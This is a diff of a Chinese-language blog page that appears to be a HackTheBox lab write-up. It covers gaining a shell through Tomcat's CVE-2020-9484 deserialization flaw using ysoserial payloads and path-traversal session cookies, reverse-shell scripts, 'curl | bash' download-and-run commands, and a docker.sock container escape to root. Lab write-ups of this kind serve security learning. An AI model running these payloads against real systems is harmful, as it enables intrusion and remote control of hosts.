@@ -121,8 +121,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -144,7 +151,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -215,30 +222,9 @@
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.205</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 14:10 CST</span><br><span class="line">Nmap scan report for 10.10.10.205</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT     STATE    SERVICE     VERSION</span><br><span class="line">22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">4567/tcp filtered tram</span><br><span class="line">6666/tcp open     zmtp        ZeroMQ ZMTP 2.0</span><br><span class="line">7676/tcp open     imqbrokerd?</span><br><span class="line">8080/tcp open     http        Apache Tomcat 9.0.27</span><br><span class="line">|_http-title: VirusBucket</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.39 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>是以个恶意软件分析平台，可以上传</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090203.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090204.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090205.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090203.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090204.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090205.jpg" alt=""></p>
 <h2 id="CVE-2020-9484"><a href="#CVE-2020-9484" class="headerlink" title="CVE-2020-9484"></a>CVE-2020-9484</h2><p>注意tomcat的版本。9.0.27，这个版本有一个反序列化漏洞，参考：</p>
 <ul>
 <li>CVE-2020-9484 tomcat session持久化漏洞分析与复现<br><a href="https://mp.weixin.qq.com/s/mHwBEHhm6_IoxHfWb9UY-A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/mHwBEHhm6_IoxHfWb9UY-A</a></li>
@@ -246,32 +232,11 @@
 </ul>
 <p>我们可以上传恶意session，但首先需要知道要知道文件上传路径，前面报错得到的是缓存路径，不是实际路径。</p>
 <p>文件名使用一个点，报错信息得到上传路径：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090206.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090206.jpg" alt=""></p>
 <h1 id="exploit-amp-user-flag"><a href="#exploit-amp-user-flag" class="headerlink" title="exploit &amp; user flag"></a>exploit &amp; user flag</h1><p>之后就是反序列化一把梭：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090201.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090201.jpg" alt=""></p>
 <h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>得到shell，读取user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090202.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090202.jpg" alt=""></p>
 <h2 id="payload-sh"><a href="#payload-sh" class="headerlink" title="payload.sh"></a>payload.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -c <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="script-sh"><a href="#script-sh" class="headerlink" title="script.sh"></a>script.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">java -jar /Users/miao/Tools/ysoserial-master-SNAPSHOT.jar CommonsCollections2 <span class="string">"curl 10.10.14.15:7778/payload.sh -o /tmp/payload.sh"</span> &gt; miao.session</span><br><span class="line">curl <span class="string">'http://10.10.10.205:8080/upload.jsp'</span> -H <span class="string">'Cookie: JSESSIONID=../../../../../opt/samples/uploads/miao'</span> -F <span class="string">'image=@miao.session'</span></span><br><span class="line">curl <span class="string">'http://10.10.10.205:8080/upload.jsp'</span> -H <span class="string">'Cookie: JSESSIONID=../../../../../opt/samples/uploads/miao'</span></span><br><span class="line"></span><br><span class="line">java -jar /Users/miao/Tools/ysoserial-master-SNAPSHOT.jar CommonsCollections2 <span class="string">"chmod 777 /tmp/payload.sh"</span> &gt; chmod.session</span><br><span class="line">curl <span class="string">'http://10.10.10.205:8080/upload.jsp'</span> -H <span class="string">'Cookie: JSESSIONID=../../../../../opt/samples/uploads/chmod'</span> -F <span class="string">'image=@chmod.session'</span></span><br><span class="line">curl <span class="string">'http://10.10.10.205:8080/upload.jsp'</span> -H <span class="string">'Cookie: JSESSIONID=../../../../../opt/samples/uploads/chmod'</span></span><br><span class="line"></span><br><span class="line">java -jar /Users/miao/Tools/ysoserial-master-SNAPSHOT.jar CommonsCollections2 <span class="string">"bash /tmp/payload.sh"</span> &gt; bash.session</span><br><span class="line">curl <span class="string">'http://10.10.10.205:8080/upload.jsp'</span> -H <span class="string">'Cookie: JSESSIONID=../../../../../opt/samples/uploads/bash'</span> -F <span class="string">'image=@bash.session'</span></span><br><span class="line">curl <span class="string">'http://10.10.10.205:8080/upload.jsp'</span> -H <span class="string">'Cookie: JSESSIONID=../../../../../opt/samples/uploads/bash'</span></span><br></pre></td></tr></table></figure>
@@ -293,53 +258,18 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py --master 10.10.10.205 --port 4609 --exec "curl 10.10.14.15:7778/payload1.sh | bash"</span><br></pre></td></tr></table></figure>
 
 <p> 得到docker容器的root：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090207.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090208.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090209.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090207.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090208.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090209.jpg" alt=""></p>
 <h2 id="payload1-sh"><a href="#payload1-sh" class="headerlink" title="payload1.sh"></a>payload1.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -c <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.14.15/4445 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>发现一个/var/run/docker.sock，容器可以通过这个socket来跟宿主机的docker服务通信：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090210.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090210.jpg" alt=""></p>
 <p>之后就是可以通过api，也可以直接把宿主机的docker二进制文件传到容器内操作</p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 宿主机</span></span><br><span class="line">tomcat@VirusBucket:/usr/bin$ python3 -m http.server 6789</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器内</span></span><br><span class="line">wget 172.17.0.1:6789/docker</span><br><span class="line">chmod +x docker</span><br><span class="line">python3 -c 'import pty; pty.spawn("/bin/sh")'</span><br><span class="line"></span><br><span class="line">./docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">sandbox             latest              a24bb4013296        3 months ago        5.57MB</span><br><span class="line">&lt;none&gt;              &lt;none&gt;              188a2704d8b0        4 months ago        1.06GB</span><br><span class="line"></span><br><span class="line">./docker run -v /root:/mnt -it sandbox</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p> 挂载目录读取root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090211.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020090211.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>CVE-2020-9484 tomcat session持久化漏洞分析与复现<br><a href="https://mp.weixin.qq.com/s/mHwBEHhm6_IoxHfWb9UY-A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/mHwBEHhm6_IoxHfWb9UY-A</a></li>
 <li>Apache Tomcat RCE by deserialization (CVE-2020-9484) - write-up and exploit - Red Timmy Security<br><a href="https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/" target="_blank" rel="noopener">https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/</a></li>
@@ -357,7 +287,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-02-22T01:12:29.167Z" itemprop="dateUpdated">2021-02-22 09:12:29</time>
+    Last updated: <time datetime="2021-02-22T01:12:29.167Z" itemprop="dateUpdated">2021-02-22 09:12:29</time>
 </span><br>
 
 
@@ -524,11 +454,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
